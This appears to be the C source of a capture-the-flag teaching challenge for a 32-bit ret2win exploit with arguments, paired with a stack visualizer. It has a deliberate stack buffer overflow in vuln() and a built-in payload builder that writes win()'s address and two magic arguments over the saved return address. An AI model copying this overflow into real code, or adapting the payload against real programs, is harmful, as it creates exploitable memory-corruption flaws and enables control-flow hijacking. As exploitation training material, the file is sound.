/*
 * main.c — ch4_32bit_args: 32-bit ret2win WITH ARGUMENTS, live colorized
 *          stack view.
 *
 * The overflow lives in vuln() below; main() just wires up the challenge
 * and hands control to the visual.h framework (vf_repl).
 *
 * Build: see Makefile (gcc -m32 ...).
 *
 * THE GOAL
 *   win(uint32_t a, uint32_t b) prints /flag.txt only when a == 0xdeadbeef
 *   and b == 0xcafebabe.  Nothing ever calls it, so you must both redirect
 *   control AND supply the arguments via the stack (i386 cdecl).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

#define VF_LABEL "ch4_32bit_args"
#define VF_TITLE "32-bit ret2win with arguments - interactive stack visualizer"
#define VF_BUF_SIZE 64
#define VF_EXTRA 3
#define VF_MAGIC_A 0xdeadbeefu
#define VF_MAGIC_B 0xcafebabeu
#include "visual.h"

void win(uint32_t a, uint32_t b)
{
    char flag[128];

    printf("\n" VF_BGRN VF_BOLD "******************* WIN *******************" VF_RST "\n");
    printf(VF_BOLD "  win(a=" VF_BCYN "0x%08x" VF_RST VF_BOLD ", b=" VF_BCYN "0x%08x" VF_RST VF_BOLD ")\n" VF_RST,
           (unsigned)a, (unsigned)b);

    if (a != VF_MAGIC_A || b != VF_MAGIC_B) {
        printf(VF_BRED "  wrong arguments: need a=0x%08x, b=0x%08x" VF_RST "\n",
               (unsigned)VF_MAGIC_A, (unsigned)VF_MAGIC_B);
        printf(VF_BRED VF_BOLD "*******************************************" VF_RST "\n");
        _exit(0);
    }

    FILE *f = fopen("/flag.txt", "r");
    if (!f) {
        printf(VF_BRED "  /flag.txt missing" VF_RST "\n");
        _exit(0);
    }
    if (fgets(flag, sizeof(flag), f)) {
        char *nl = strchr(flag, '\n');
        if (nl) *nl = '\0';
        printf(VF_BGRN VF_BOLD "  SECRET: %s" VF_RST "\n", flag);
    }
    fclose(f);
    printf(VF_BGRN VF_BOLD "*******************************************" VF_RST "\n");
    _exit(0);
}

/* ------------------------- the vulnerable function ------------------- */
void vuln(void)
{
    char buf[VF_BUF_SIZE];

    VF_SETUP(buf);
    vf_preview();

    if (vf_len) {
        size_t n = vf_len > VF_MAX_LEN ? VF_MAX_LEN : vf_len;
        memcpy(buf, vf_payload, n);    /* <-- the overflow */
    }
    vf_restore(buf);
}

/* ------------------------------ win payload --------------------------- */
/*   [ 'A'*64 ][ 'B'*4 ][ p32(win) ][ p32(fake_ret) ][ p32(a) ][ p32(b) ] */
static void build_win(unsigned char *out, size_t *out_len)
{
    size_t off = vf_eip_off, n = 0;
    uint32_t winp = (uint32_t)(uintptr_t)&win;
    uint32_t fake = 0x08049022;         /* harmless `ret`-ish filler */
    uint32_t a = VF_MAGIC_A, b = VF_MAGIC_B;

    memset(out, 'A', VF_BUF_SIZE); n = VF_BUF_SIZE;
    while (n < off) out[n++] = 'B';
    memcpy(out + n, &winp, 4); n += 4;  /* saved EIP -> win()        */
    memcpy(out + n, &fake, 4); n += 4;  /* fake return address       */
    memcpy(out + n, &a, 4);    n += 4;  /* arg a = 0xdeadbeef        */
    memcpy(out + n, &b, 4);    n += 4;  /* arg b = 0xcafebabe        */
    *out_len = n;
}

static void banner(void)
{
    printf(VF_BOLD "  win(a, b) = " VF_BGRN "0x%08x" VF_RST VF_BOLD
           ", needs a=" VF_BCYN "0x%08x" VF_RST VF_BOLD " b=" VF_BCYN "0x%08x" VF_RST "\n",
           (unsigned)(uintptr_t)&win, (unsigned)VF_MAGIC_A, (unsigned)VF_MAGIC_B);
    printf(VF_DIM "  goal: hijack EIP into win() AND set its stack arguments" VF_RST "\n");
}

int main(void)
{
    vf_banner_hook = banner;
    vf_win_builder = build_win;
    return vf_repl();
}
